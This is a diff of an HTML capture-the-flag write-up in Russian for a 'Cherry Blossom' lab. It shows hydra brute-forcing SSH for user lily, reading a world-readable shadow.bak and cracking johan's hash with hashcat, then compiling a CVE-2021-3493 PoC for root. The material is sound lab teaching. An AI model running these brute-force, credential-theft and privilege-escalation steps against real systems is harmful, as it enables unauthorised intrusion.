+<span class="go">[REDACTED]        (Journal.ctz)     </span>
+<span class="go">1g 0:00:01:19 DONE (2026-07-01 06:55) 0.01264g/s 70.79p/s 70.79c/s 70.79C/s spartans..inferno</span>
 </code></pre></div></td></tr></table></div>
+</details>
 <p>С получением пароля данный архив можно открыть в вышеупомянутом приложении Cherrytree. В результате появится упорядоченный список различных заметок.</p>
 <p><img alt="Cherrytree" src="../cblossom-cherrytree.webp" /></p>
 <h3 id="_6">Исследование записей</h3>
 <p>В одной из записей был обнаружен первый флаг.</p>
 <p><img alt="Флаг в дневнике" src="../cblossom-jflag.webp" /></p>
 <p>Среди записей была обнаружена ещё одна примечательная: в ней автор рассказывал о составленном им списке паролей. Сам список паролей был прикреплен к одной из записей. Кроме того, было упомянуто имя <code>lily</code>. С учетом полученного имени пользователя и списка паролей было решено воспользоваться <code>hydra</code> для подбора пароля и дальнейшего подключения к ssh (22 порт).</p>
+<details class="note">
+<summary>Результат работы hydra</summary>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
 <span class="normal">3</span>
 <span class="normal">4</span>
-<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>hydra<span class="w"> </span>-l<span class="w"> </span>lily<span class="w"> </span>-P<span class="w"> </span>cherry-blossom.list<span class="w"> </span>ssh://10.113.182.130
+<span class="normal">5</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>hydra<span class="w"> </span>-l<span class="w"> </span>lily<span class="w"> </span>-P<span class="w"> </span>cherry-blossom.list<span class="w"> </span>ssh://10.113.182.130
 
-Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhauser-thc/thc-hydra<span class="o">)</span><span class="w"> </span>starting<span class="w"> </span>at<span class="w"> </span><span class="m">2026</span>-07-01<span class="w"> </span><span class="m">07</span>:14:58
-<span class="o">[</span><span class="m">22</span><span class="o">][</span>ssh<span class="o">]</span><span class="w"> </span>host:<span class="w"> </span><span class="m">10</span>.113.182.130<span class="w">   </span>login:<span class="w"> </span>lily<span class="w">   </span>password:<span class="w"> </span><span class="o">[</span>REDACTED<span class="o">]</span>
-<span class="m">1</span><span class="w"> </span>of<span class="w"> </span><span class="m">1</span><span class="w"> </span>target<span class="w"> </span>successfully<span class="w"> </span>completed,<span class="w"> </span><span class="m">1</span><span class="w"> </span>valid<span class="w"> </span>password<span class="w"> </span>found
+<span class="go">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-07-01 07:14:58</span>
+<span class="go">[22][ssh] host: 10.113.182.130   login: lily   password: [REDACTED]</span>
+<span class="go">1 of 1 target successfully completed, 1 valid password found</span>
 </code></pre></div></td></tr></table></div>
+</details>
 <p>После успешного подбора пароля был осуществлён успешный вход по ssh за пользователя <code>lily</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
@@ -1064,35 +1103,35 @@ Hydra<span class="w"> </span><span class="o">(</span>https://github.com/vanhause
 <span class="normal">5</span>
 <span class="normal">6</span>
 <span class="normal">7</span>
-<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>ssh<span class="w"> </span>lily@10.113.182.130
+<span class="normal">8</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>ssh<span class="w"> </span>lily@10.113.182.130
 
 
-<span class="w">        </span><span class="c1">#####################################</span>
-<span class="w">        </span><span class="c1">##########  Welcome, Lily  ##########</span>
-<span class="w">        </span><span class="c1">#####################################</span>
+<span class="gp">        #</span><span class="c1">####################################</span>
+<span class="gp">        #</span><span class="c1">#########  Welcome, Lily  ##########</span>
+<span class="gp">        #</span><span class="c1">####################################</span>
 
-lily@cherryblossom:~$<span class="w"> </span>
+<span class="gp">lily@cherryblossom:~$ </span>
 </code></pre></div></td></tr></table></div>
 <h2 id="lateral-movement-t1003008-t1110002-t1021004">Lateral Movement и второй флаг — <code>T1003.008</code>, <code>T1110.002</code>, <code>T1021.004</code></h2>
 <p>После успешного входа за <code>lily</code> было выполнено исследование окружение, которое в конечном итоге позволило обнаружить бэкап файла <code>shadow</code> по пути <code>/var/backups/shadow.bak</code>.</p>
 <div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
 <span class="normal">2</span>
-<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code>lily@cherryblossom:/var/backups$<span class="w"> </span>ls<span class="w"> </span>-la
+<span class="normal">3</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">lily@cherryblossom:/var/backups$ </span>ls<span class="w"> </span>-la
 
--r--r--r--<span class="w">  </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>shadow<span class="w">    </span><span class="m">1481</span><span class="w"> </span>Feb<span class="w">  </span><span class="m">9</span><span class="w">  </span><span class="m">2020</span><span class="w"> </span>shadow.bak
+<span class="go">-r--r--r--  1 root shadow    1481 Feb  9  2020 shadow.bak</span>
 </code></pre></div></td></tr></table></div>
 <p>При исследовании окружения ранее было замечено наличие еще одной папки пользователя в директории <code>/home</code> по имени <code>johan</code>. Именно его хэш был извлечен из обнаруженного <code>shadow.bak</code>.</p>
 <p><img alt="Содержимое shadow.bak" src="../cblossom-johanpass.webp" /></p>
 <p>Для подбора пароля с использованием полученного хэша был применен тул <code>hashcat</code>. Использовался ранее полученный словарь в приложении Cherrytree.</p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>$<span class="w"> </span>hashcat<span class="w"> </span>-a0<span class="w"> </span>-m1800<span class="w"> </span><span class="s1">'[REDACTED_HASH]'</span><span class="w"> </span>cherry-blossom.list
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="gp">$ </span>hashcat<span class="w"> </span>-a0<span class="w"> </span>-m1800<span class="w"> </span><span class="s1">'[REDACTED_HASH]'</span><span class="w"> </span>cherry-blossom.list
 </code></pre></div></td></tr></table></div>
-<p>С помощью полученного пароля был осуществлен в ход за пользователя <code>johan</code>. В домашней директории пользовался находился второй флаг в файле <code>user.txt</code>.</p>
+<p>С помощью полученного пароля был осуществлен вход за пользователя <code>johan</code>. В домашней директории пользовался находился второй флаг в файле <code>user.txt</code>.</p>
 <p><img alt="Флаг user.txt" src="../cblossom-userflag.webp" /></p>
 <h2 id="t1068">Повышение привилегий, третий флаг — T1068</h2>
 <p>После получения доступа к системе в качестве <code>johan</code> было принято решение воспользоваться тулом <code>Linux Exploit Suggester</code> для сканирования системы на предмет CVE, к которым она уязвима.</p>
 <p><img alt="Вывод LSE" src="../cblossom-exploit_1.webp" /></p>
 <p>Среди обнаруженных результатов выбор пал на <code>CVE-2021-3493</code>. Для эксплуатации уязвимости на целевую систему с помощью <code>scp</code> был перемещён PoC для данной CVE, который был заранее скомпиллирован на атакующей машине.</p>
-<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>gcc<span class="w"> </span>exploit.c<span class="w"> </span>-o<span class="w"> </span>file_1<span class="w"> </span>-static
+<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="go">gcc exploit.c -o file_1 -static</span>
 </code></pre></div></td></tr></table></div>
 <p>Уязвимость была успешно эксплуатирована, и в конечном итоге были получены рут права в системе. Третий флаг находился по пути <code>/root/root.txt</code>. Все три флага были добыты.</p>
 <p><img alt="Флаг root.txt" src="../cblossom-rootflag.webp" /></p>
